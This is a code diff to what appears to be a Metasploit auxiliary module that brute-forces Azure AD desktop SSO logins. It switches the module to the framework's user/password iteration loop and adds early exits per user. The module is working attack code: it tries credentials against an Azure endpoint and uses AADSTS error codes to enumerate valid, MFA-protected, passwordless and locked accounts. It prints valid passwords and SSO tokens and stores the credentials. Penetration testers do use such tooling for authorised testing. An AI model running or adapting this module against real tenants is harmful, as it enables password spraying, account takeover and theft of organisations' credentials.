@@ -7,7 +7,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
-  include Msf::Auxiliary::Scanner
 
   def initialize
     super(
@@ -47,7 +46,7 @@ class MetasploitModule < Msf::Auxiliary
                        'BLANK_PASSWORDS', 'RHOSTS')
   end
 
-  def report_login(rhost, rport, domain, username, password)
+  def report_login(domain, username, password)
     # report information, if needed
     service_data = {
       address: rhost,
@@ -72,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def check_login(rhost, rport, targeturi, domain, username, password)
+  def check_login(targeturi, domain, username, password)
     request_id = SecureRandom.uuid
     url = "https://#{rhost}/#{domain}#{targeturi}"
 
@@ -134,55 +133,35 @@ class MetasploitModule < Msf::Auxiliary
     if xml.xpath('//DesktopSsoToken')[0]
       print_good("Login #{domain}\\#{username}:#{password} is valid!")
       print_good("Desktop SSO Token: #{auth_details}")
-      report_login(rhost, rport, domain, username, password)
+      report_login(domain, username, password)
+      :next_user
     elsif auth_details.start_with?('AADSTS50126') # Valid user but incorrect password
       print_good("Password #{password} is invalid but #{domain}\\#{username} is valid!")
-      report_login(rhost, rport, domain, username, nil)
+      report_login(domain, username, nil)
     elsif auth_details.start_with?('AADSTS50056') # User exists without a password in Azure AD
       print_good("#{domain}\\#{username} is valid but the user does not have a password in Azure AD!")
-      report_login(rhost, rport, domain, username, nil)
+      report_login(domain, username, nil)
+      :next_user
     elsif auth_details.start_with?('AADSTS50076') # User exists, but you need MFA to connect to this resource
       print_good("Login #{domain}\\#{username}:#{password} is valid, but you need MFA to connect to this resource")
-      report_login(rhost, rport, domain, username, password)
+      report_login(domain, username, password)
+      :next_user
     elsif auth_details.start_with?('AADSTS50014') # User exists, but the maximum Pass-through Authentication time was exceeded
       print_good("#{domain}\\#{username} is valid but the maximum pass-through authentication time was exceeded")
-      report_login(rhost, rport, domain, username, nil)
+      report_login(domain, username, nil)
     elsif auth_details.start_with?('AADSTS50034') # User does not exist
       print_error("#{domain}\\#{username} is not a valid user")
     elsif auth_details.start_with?('AADSTS50053') # Account is locked
       print_error('Account is locked, consider taking time before continuuing to scan!')
+      :next_user
     else # Unknown error code
       print_error("Received unknown response with error code: #{auth_details}")
     end
   end
 
-  def check_logins(rhost, rport, targeturi, domain, usernames, passwords)
-    for username in usernames do
-      for password in passwords do
-        check_login(rhost, rport, targeturi, domain,
-                    username.strip.encode(xml: :text), password.strip.encode(xml: :text))
-      end
-    end
-  end
-
   def run
-    # Check whether the username is a file or string, stick either in an array
-    if datastore['USER_FILE']
-      usernames = File.readlines(datastore['USER_FILE'])
-    elsif datastore['USERNAME']
-      usernames = [datastore['USERNAME']]
-    else
-      fail_with(Failure::BadConfig, 'Either USERNAME or USER_FILE must be set')
+    each_user_pass do |cur_user, cur_pass|
+      check_login(datastore['TARGETURI'], datastore['DOMAIN'], cur_user, cur_pass)
     end
-    if datastore['PASS_FILE']
-      passwords = File.readlines(datastore['PASS_FILE'])
-    elsif datastore['PASSWORD']
-      passwords = [datastore['PASSWORD']]
-    else
-      fail_with(Failure::BadConfig, 'Either PASSWORD or PASS_FILE must be set')
-    end
-
-    check_logins(datastore['RHOST'], datastore['RPORT'], datastore['TARGETURI'],
-                 datastore['DOMAIN'], usernames, passwords)
   end
 end
